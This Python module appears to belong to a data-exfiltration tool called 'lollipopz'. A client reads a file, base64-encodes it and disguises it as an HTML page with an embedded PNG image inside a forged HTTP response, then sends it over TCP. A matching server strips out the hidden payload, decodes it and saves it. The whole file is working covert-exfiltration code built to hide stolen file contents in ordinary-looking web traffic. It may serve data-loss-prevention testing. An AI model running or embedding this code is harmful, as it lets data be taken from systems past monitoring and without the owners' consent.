import base64

from scapy.layers import http

import lollipopz as lpz
from lollipopz import methods


class Server(methods.HTTPServer):

    REQUEST_HTTP = (
        'GET / HTTP/1.1\r\n\r\n'
    )
    PAYLOAD_START = 'image/png;base64,'
    PAYLOAD_END = '" alt=""'

    def handle(self, request, client_address):
        data = self.receive(request)
        http_request = http.HTTPResponse(data)
        try:
            encoded = http_request.payload.load.decode()
        except AttributeError:
            pass
        else:
            based64 = encoded[
                encoded.index(self.PAYLOAD_START) + len(self.PAYLOAD_START):encoded.index(self.PAYLOAD_END)
            ]
            decrypted = base64.b64decode(based64).decode('utf8')
            lpz.logger.info(f'-> Encrypted body: {based64}')
            lpz.logger.info(f'-> Decrypted body: \r\n{decrypted}')
            self.output_write(decrypted)
            request.sendall(self.REQUEST_HTTP.encode('utf8'))
            lpz.logger.info(f'-> Sent response to {client_address}')


class Client(methods.TCPClient):

    RESPONSE_HTTP = (
        'HTTP/1.1 200 OK\r\n'
        'Content-Type: text/html\r\n'
        'Access-Control-Allow-Origin: *\r\n'
        'Last-Modified: Wed, 01 Jan 2020 00:00:00 GMT\r\n'
        'Date: {}\r\n'
        'Pragma: no-cache\r\n'
        'Content-Length: {}\r\n'
        'Server: Apache\r\n'
        '\r\n'
        '{}\r\n\r\n'
    )
    PNG_BASE64 = (
        '<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<title>Image Download</title>\r\n</head>\r\n<body>\r\n'
        '<img src="data:image/png;base64,{}" alt="">\r\n'
        '</body>\r\n</html>'
    )

    def prepare_data(self, data):
        return self.RESPONSE_HTTP.format(
            self.date_now_rfc_1123(),
            len(data),
            self.PNG_BASE64.format(data)
        )

    def execute(self):
        infile = self.args['infile'].read()
        msg = base64.b64encode(infile)
        lpz.logger.info(f'-> Sending base64 encoded content')
        data = self.prepare_data(msg.decode('utf8'))
        self.send(data.encode('utf8'))
